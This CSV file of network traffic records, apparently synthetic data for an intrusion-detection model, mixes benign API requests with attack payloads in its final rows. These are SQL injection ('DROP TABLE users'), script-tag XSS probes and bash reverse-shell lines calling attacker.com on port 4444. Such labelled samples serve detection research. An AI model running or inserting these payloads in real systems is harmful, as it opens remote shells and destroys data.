source_ip,payload,packet_size,request_rate,timestamp
192.168.1.103,GET /api/data_0,47.24882755418025,16.546299217351223,2026-03-14 08:54:45.944602
192.168.1.72,GET /api/data_1,44.4405994097654,15.95670655406815,2026-03-14 08:54:55.944696
192.168.1.211,GET /api/data_2,49.526894990510144,12.213515699898203,2026-03-14 08:55:05.944724
192.168.1.117,GET /api/data_3,57.896064077536955,17.302304187458727,2026-03-14 08:55:15.944746
192.168.1.150,GET /api/data_4,50.39915906107852,14.521450495028777,2026-03-14 08:55:25.944766
192.168.1.158,GET /api/data_5,47.09560932988242,13.424490578465557,2026-03-14 08:55:35.944785
192.168.1.21,GET /api/data_6,57.311890601730084,19.616144902843793,2026-03-14 08:55:45.944803
192.168.1.253,GET /api/data_7,41.375410837434835,13.313137412277083,2026-03-14 08:55:55.944820
192.168.1.59,GET /api/data_8,47.34091294890886,14.64757349468595,2026-03-14 08:56:05.944836
192.168.1.188,GET /api/data_9,46.48328099146296,8.581138031771282,2026-03-14 08:56:15.944854
192.168.1.175,GET /api/data_10,42.61835153422699,19.4609428741416,2026-03-14 08:56:25.944870
192.168.1.244,GET /api/data_11,47.27808637737409,15.332767769129598,2026-03-14 08:56:35.944887
192.168.1.51,GET /api/data_12,47.37438574434995,20.73831381407762,2026-03-14 08:56:45.944903
192.168.1.18,GET /api/data_13,46.99873074947044,17.842319463139916,2026-03-14 08:56:55.944920
192.168.1.53,GET /api/data_14,46.25461738278322,12.664853978727317,2026-03-14 08:57:05.944936
192.168.1.188,GET /api/data_15,49.93251387631033,11.8268672131323,2026-03-14 08:57:15.944952
192.168.1.175,GET /api/data_16,48.06763524717722,11.523689274224752,2026-03-14 08:57:25.944968
192.168.1.50,GET /api/data_17,43.67440443038679,18.275976793073013,2026-03-14 08:57:35.944985
192.168.1.134,GET /api/data_18,51.61499898639149,10.819749177381889,2026-03-14 08:57:45.945001
192.168.1.221,GET /api/data_19,53.69233289997705,15.514104843569912,2026-03-14 08:57:55.945018
192.168.1.200,GET /api/data_20,53.927660622491224,22.968030273816126,2026-03-14 08:58:05.945056
192.168.1.190,GET /api/data_21,44.95457328567446,10.250117359389337,2026-03-14 08:58:15.945075
192.168.1.82,GET /api/data_22,61.70373167051523,18.212955561052105,2026-03-14 08:58:25.945092
192.168.1.217,GET /api/data_23,51.718091447842305,9.710879533911799,2026-03-14 08:58:35.945108
192.168.1.41,GET /api/data_24,45.782900383203575,13.460023783808502,2026-03-14 08:58:45.945125
192.168.1.89,GET /api/data_25,52.9106139735652,17.663245378780072,2026-03-14 08:58:55.945141
192.168.1.163,GET /api/data_26,52.38021293713486,18.91098380519575,2026-03-14 08:59:05.945164
192.168.1.234,GET /api/data_27,45.80391238388681,14.072362872446357,2026-03-14 08:59:15.945183
192.168.1.135,GET /api/data_28,49.15897455950457,18.49430593651357,2026-03-14 08:59:25.945200
192.168.1.33,GET /api/data_29,49.11133939364672,13.768850073941099,2026-03-14 08:59:35.945217
203.0.113.216,'; DROP TABLE users; -- 0,59.7500269775359,21.453032937150727,2026-03-14 08:59:45.945236
203.0.113.214,'; DROP TABLE users; -- 1,54.63994939209833,20.007065795784047,2026-03-14 08:59:55.945261
203.0.113.101,'; DROP TABLE users; -- 2,50.33118579543975,19.568416375307876,2026-03-14 09:00:05.945280
203.0.113.142,'; DROP TABLE users; -- 3,71.86148126813336,16.15921838986525,2026-03-14 09:00:15.945297
203.0.113.15,'; DROP TABLE users; -- 4,54.247330708701085,16.068884656210052,2026-03-14 09:00:25.945314
10.0.0.179,<script>alert('XSS_0')</script>,48.435235341190854,11.102977948602398,2026-03-14 09:00:35.945333
10.0.0.52,<script>alert('XSS_1')</script>,56.97140421504293,13.742068625190079,2026-03-14 09:00:45.945352
10.0.0.229,<script>alert('XSS_2')</script>,45.327917731632475,7.514838387556992,2026-03-14 09:00:55.945369
10.0.0.171,<script>alert('XSS_3')</script>,56.114602496706866,14.471199230925425,2026-03-14 09:01:05.945386
10.0.0.28,<script>alert('XSS_4')</script>,52.57701058851037,12.986253328979053,2026-03-14 09:01:15.945403
45.33.2.28,bash -i >& /dev/tcp/attacker.com/4444_0 0>&1,50.34094146237813,17.202518236788286,2026-03-14 09:01:25.945421
45.33.2.190,bash -i >& /dev/tcp/attacker.com/4444_1 0>&1,57.4874485341991,20.351106587909666,2026-03-14 09:01:35.945440
45.33.2.92,bash -i >& /dev/tcp/attacker.com/4444_2 0>&1,54.89633300610351,19.488470726082117,2026-03-14 09:01:45.945457
45.33.2.129,bash -i >& /dev/tcp/attacker.com/4444_3 0>&1,50.43156738747137,17.072970103735763,2026-03-14 09:01:55.945474
45.33.2.116,bash -i >& /dev/tcp/attacker.com/4444_4 0>&1,46.60244010706796,17.96185442926386,2026-03-14 09:02:05.945491
